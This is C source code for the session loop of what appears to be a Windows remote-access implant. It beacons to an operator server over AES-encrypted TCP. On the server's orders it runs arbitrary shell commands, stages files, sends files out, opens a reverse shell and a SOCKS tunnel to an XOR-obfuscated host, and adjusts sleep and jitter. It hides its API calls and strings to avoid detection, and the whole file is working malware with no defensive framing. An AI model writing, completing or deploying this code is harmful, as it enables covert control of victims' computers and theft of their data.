#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <string.h>
#include "session.h"
#include "protocol.h"
#include "crypto.h"
#include "dynapi.h"
#include "obf.h"
#include "obf_strings.h"
#include "exec.h"
#include "builtin.h"
#include "shell.h"
#include "transfer.h"
#include "socks.h"
#include <stdio.h>

/* ---- helpers (no PEB walk needed) ---- */

static uint16_t my_htons(uint16_t x) {
    return (uint16_t)((x >> 8) | (x << 8));
}

/* parse dotted-quad a.b.c.d into network-byte-order uint32 */
static uint32_t my_inet_addr(const char *s) {
    uint32_t parts[4] = {0};
    int idx = 0;
    const char *p = s;
    while (*p && idx < 4) {
        uint32_t v = 0;
        while (*p >= '0' && *p <= '9') {
            v = v * 10 + (uint32_t)(*p - '0');
            p++;
        }
        parts[idx++] = v;
        if (*p == '.') p++;
    }
    if (idx != 4) return 0;
    return (parts[0]) | (parts[1] << 8) | (parts[2] << 16) | (parts[3] << 24);
}

/* ---- critical section for thread-safe writes ---- */

static CRITICAL_SECTION g_cs_socket;
static int g_cs_init = 0;

/* ---- send_all / recv_all ---- */

static int send_all(SOCKET sock, const uint8_t *buf, int len) {
    int sent = 0;
    while (sent < len) {
        int n = fnSend(sock, (const char *)(buf + sent), len - sent, 0);
        if (n <= 0) return -1;
        sent += n;
    }
    return 0;
}

static int recv_all(SOCKET sock, uint8_t *buf, int len) {
    int got = 0;
    while (got < len) {
        int n = fnRecv(sock, (char *)(buf + got), len - got, 0);
        if (n <= 0) return -1;
        got += n;
    }
    return 0;
}

/* ---- socks thread trampoline ---- */

static DWORD WINAPI socks_loop_thread(LPVOID param) {
    (void)param;
    extern SOCKET   g_socks_sock;
    extern uint8_t  g_socks_key[32];
    extern uint32_t g_socks_beacon_id;
    socks_loop(g_socks_sock, g_socks_key, g_socks_beacon_id);
    return 0;
}

/* ---- public API ---- */

int session_init(void) {
    WSADATA wsa;
    return fnWSAStartup(MAKEWORD(2, 2), &wsa);
}

SOCKET session_connect(const char *host, uint16_t port) {
    SOCKET s = fnSocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return INVALID_SOCKET;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family      = AF_INET;
    addr.sin_port        = my_htons(port);
    addr.sin_addr.s_addr = my_inet_addr(host);

    if (fnConnect(s, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
        fnClosesocket(s);
        return INVALID_SOCKET;
    }
    return s;
}

int session_write(SOCKET sock, const uint8_t *data, int len) {
    uint8_t hdr[4];
    hdr[0] = (uint8_t)(len);
    hdr[1] = (uint8_t)(len >> 8);
    hdr[2] = (uint8_t)(len >> 16);
    hdr[3] = (uint8_t)(len >> 24);
    if (send_all(sock, hdr, 4) != 0) return -1;
    if (send_all(sock, data, len) != 0) return -1;
    return 0;
}

int session_read(SOCKET sock, uint8_t *out, int *out_len) {
    uint8_t hdr[4];
    if (recv_all(sock, hdr, 4) != 0) return -1;
    int len = (int)hdr[0] | ((int)hdr[1] << 8)
            | ((int)hdr[2] << 16) | ((int)hdr[3] << 24);
    if (len <= 0 || len > MAX_ENVELOPE) return -1;
    if (recv_all(sock, out, len) != 0) return -1;
    *out_len = len;
    return 0;
}

int safe_session_write(SOCKET sock, const uint8_t *data, int len) {
    fnEnterCriticalSection(&g_cs_socket);
    int rc = session_write(sock, data, len);
    fnLeaveCriticalSection(&g_cs_socket);
    return rc;
}

int send_result_session(SOCKET sock, uint32_t label, uint8_t type, uint8_t code,
                        uint16_t flags, const char *output,
                        uint8_t *session_key) {
    DWORD out_len = (DWORD)strlen(output);
    if (out_len > 65536) out_len = 65536;
    DWORD body_len = 4 + out_len;
    DWORD pkt_len = 16 + body_len;

    uint8_t *pkt = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)pkt_len);
    if (!pkt) return -1;

    task_header_t hdr = {0};
    hdr.type   = type;
    hdr.code   = code;
    hdr.flags  = flags;
    hdr.label  = label;
    hdr.length = body_len;
    encode_header(&hdr, pkt);

    pkt[16] = (uint8_t)(out_len);
    pkt[17] = (uint8_t)(out_len >> 8);
    pkt[18] = (uint8_t)(out_len >> 16);
    pkt[19] = (uint8_t)(out_len >> 24);
    memcpy(pkt + 20, output, out_len);

    uint8_t *enc = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)pkt_len + 64);
    if (!enc) { fnLocalFree(pkt); return -1; }
    DWORD enc_len = (DWORD)pkt_len + 64;
    if (aes_encrypt(session_key, pkt, pkt_len, enc, &enc_len) != 0) {
        fnLocalFree(pkt); fnLocalFree(enc); return -1;
    }
    fnLocalFree(pkt);

    int rc = safe_session_write(sock, enc, (int)enc_len);
    fnLocalFree(enc);
    return rc;
}

int send_result_raw_session(SOCKET sock, uint32_t label, uint8_t type,
                            uint16_t flags, uint32_t identifier,
                            const uint8_t *data, uint32_t data_len,
                            uint8_t *session_key) {
    DWORD pkt_len = 16 + data_len;
    uint8_t *pkt = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)pkt_len);
    if (!pkt) return -1;

    task_header_t hdr = {0};
    hdr.type       = type;
    hdr.code       = 0;
    hdr.flags      = flags;
    hdr.label      = label;
    hdr.identifier = identifier;
    hdr.length     = data_len;
    encode_header(&hdr, pkt);
    if (data_len > 0 && data) memcpy(pkt + 16, data, data_len);

    uint8_t *enc = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)pkt_len + 64);
    if (!enc) { fnLocalFree(pkt); return -1; }
    DWORD enc_len = (DWORD)pkt_len + 64;
    if (aes_encrypt(session_key, pkt, pkt_len, enc, &enc_len) != 0) {
        fnLocalFree(pkt); fnLocalFree(enc); return -1;
    }
    fnLocalFree(pkt);

    int rc = safe_session_write(sock, enc, (int)enc_len);
    fnLocalFree(enc);
    return rc;
}

void session_loop(SOCKET sock, uint8_t *session_key, uint32_t beacon_id,
                  DWORD *sleep_ms, DWORD *jitter_pct) {
    /* initialize critical section for thread-safe writes */
    fnInitializeCriticalSection(&g_cs_socket);
    g_cs_init = 1;

    /* ---- identification: 4 bytes plaintext beacon_id + 1 byte conn type ---- */
    uint8_t id_buf[4];
    id_buf[0] = (uint8_t)(beacon_id);
    id_buf[1] = (uint8_t)(beacon_id >> 8);
    id_buf[2] = (uint8_t)(beacon_id >> 16);
    id_buf[3] = (uint8_t)(beacon_id >> 24);
    if (send_all(sock, id_buf, 4) != 0) goto cleanup;

    /* connection type byte: CONN_SESSION */
    {
        uint8_t conn_type = CONN_SESSION;
        if (send_all(sock, &conn_type, 1) != 0) goto cleanup;
    }

    /* encrypted confirmation: beacon_id encrypted with session key */
    {
        uint8_t enc_buf[128];
        DWORD   enc_len = (DWORD)sizeof(enc_buf);
        if (aes_encrypt(session_key, id_buf, 4, enc_buf, &enc_len) != 0) goto cleanup;
        if (session_write(sock, enc_buf, (int)enc_len) != 0) goto cleanup;
    }

    /* ---- main read loop ---- */
    while (1) {
        uint8_t *enc_data = (uint8_t *)fnLocalAlloc(0x40, MAX_ENVELOPE);
        if (!enc_data) goto cleanup;

        int enc_len = 0;
        if (session_read(sock, enc_data, &enc_len) != 0) {
            fnLocalFree(enc_data);
            goto cleanup;
        }

        uint8_t *plain = (uint8_t *)fnLocalAlloc(0x40, (SIZE_T)enc_len + 64);
        DWORD plain_len = (DWORD)enc_len + 64;
        if (!plain) {
            fnLocalFree(enc_data);
            goto cleanup;
        }

        if (aes_decrypt(session_key, enc_data, (DWORD)enc_len,
                        plain, &plain_len) != 0 || plain_len < 16) {
            fnLocalFree(plain);
            fnLocalFree(enc_data);
            goto cleanup;
        }
        fnLocalFree(enc_data);

        /* decode task header */
        task_header_t hdr;
        decode_header(plain, &hdr);
        uint32_t task_data_len = hdr.length;
        const uint8_t *task_data = (16 + task_data_len <= plain_len)
                                    ? plain + 16 : NULL;

        if (hdr.type == TASK_NOP) {
            /* reply with NOP so server updates last_seen */
            task_header_t nop_hdr = {0};
            nop_hdr.type = TASK_NOP;
            uint8_t nop_buf[16];
            encode_header(&nop_hdr, nop_buf);
            uint8_t *nop_enc = (uint8_t *)fnLocalAlloc(0x40, 128);
            if (nop_enc) {
                DWORD nop_enc_len = 128;
                if (aes_encrypt(session_key, nop_buf, 16, nop_enc, &nop_enc_len) == 0) {
                    safe_session_write(sock, nop_enc, (int)nop_enc_len);
                }
                fnLocalFree(nop_enc);
            }
            fnLocalFree(plain);
            continue;
        }

        if (hdr.type == TASK_RUN && hdr.code == CODE_RUN_SHELL) {
            char cmd[1024] = {0};
            decode_run_req(task_data, (int)task_data_len, cmd, sizeof(cmd));

            char output[65536] = {0};
            if (builtin_dispatch(cmd, output, sizeof(output))) {
                /* handled natively */
            } else if (xor_prefix(cmd, ENC_SHELL_PREFIX, ENC_SHELL_PREFIX_LEN)) {
                run_command_shell(cmd + ENC_SHELL_PREFIX_LEN, output, sizeof(output));
            } else {
                run_command_direct(cmd, output, sizeof(output));
            }

            send_result_session(sock, hdr.label, TASK_RUN, CODE_RUN_SHELL,
                                FLAG_NONE, output, session_key);
        }
        else if (hdr.type == TASK_SET && hdr.code == CODE_SET_SLEEP
                 && task_data_len >= 8 && task_data) {
            const uint8_t *d = task_data;
            DWORD interval = (DWORD)d[0] | ((DWORD)d[1]<<8)
                           | ((DWORD)d[2]<<16) | ((DWORD)d[3]<<24);
            DWORD jitter   = (DWORD)d[4] | ((DWORD)d[5]<<8)
                           | ((DWORD)d[6]<<16) | ((DWORD)d[7]<<24);
            *sleep_ms   = interval * 1000;
            *jitter_pct = jitter;

            char fmt[] = {'s','l','e','e','p','=','%','u','s',' ',
                          'j','i','t','t','e','r','=','%','u','%','%','\0'};
            char msg[64];
            snprintf(msg, sizeof(msg), fmt, (unsigned)interval, (unsigned)jitter);
            send_result_session(sock, hdr.label, TASK_SET, CODE_SET_SLEEP,
                                FLAG_NONE, msg, session_key);
        }
        else if (hdr.type == TASK_FILE_STAGE && task_data) {
            handle_file_stage(beacon_id, hdr.label, hdr.identifier,
                              hdr.flags, task_data, task_data_len,
                              session_key, sock);
        }
        else if (hdr.type == TASK_FILE_EXFIL && task_data) {
            handle_file_exfil(beacon_id, hdr.label,
                              (const char *)task_data,
                              session_key, sock);
        }
        else if (hdr.type == TASK_SHELL_START && task_data && task_data_len >= 2) {
            uint16_t shell_port = (uint16_t)task_data[0]
                                | ((uint16_t)task_data[1] << 8);
            char shell_host[ENC_SERVER_HOST_LEN + 1];
            xor_dec(shell_host, ENC_SERVER_HOST, ENC_SERVER_HOST_LEN);
            shell_start(shell_host, shell_port, session_key, beacon_id, hdr.label);
        }
        else if (hdr.type == TASK_SHELL_STOP) {
            shell_stop();
        }
        else if (hdr.type == TASK_SOCKS_START && task_data && task_data_len >= 2) {
            uint16_t socks_port = (uint16_t)task_data[0]
                                | ((uint16_t)task_data[1] << 8);
            char socks_host[ENC_SERVER_HOST_LEN + 1];
            xor_dec(socks_host, ENC_SERVER_HOST, ENC_SERVER_HOST_LEN);
            if (socks_tcp_connect(socks_host, socks_port,
                                  session_key, beacon_id) == 0) {
                HANDLE ht = fnCreateThread(NULL, 0,
                    (LPTHREAD_START_ROUTINE)socks_loop_thread, NULL, 0, NULL);
                if (ht) fnCloseHandle2(ht);
            }
        }
        else if (hdr.type == TASK_SOCKS_STOP) {
            extern SOCKET g_socks_sock;
            if (g_socks_sock != INVALID_SOCKET) {
                fnClosesocket(g_socks_sock);
            }
        }
        else if (hdr.type == TASK_EXIT) {
            fnLocalFree(plain);
            fnDeleteCriticalSection(&g_cs_socket);
            g_cs_init = 0;
            session_cleanup(sock);
            fnExitProcess(0);
        }
        else if (hdr.type == TASK_INTERACTIVE) {
            /* already in session mode */
        }
        else {
            char err[] = {'u','n','k','n','o','w','n',' ','t','a','s','k','\0'};
            send_result_session(sock, hdr.label, hdr.type, 0,
                                FLAG_ERROR, err, session_key);
        }

        fnLocalFree(plain);
    }

cleanup:
    if (shell_is_active()) {
        shell_stop();
    }
    if (g_cs_init) {
        fnDeleteCriticalSection(&g_cs_socket);
        g_cs_init = 0;
    }
}

void session_cleanup(SOCKET sock) {
    fnClosesocket(sock);
    fnWSACleanup();
}
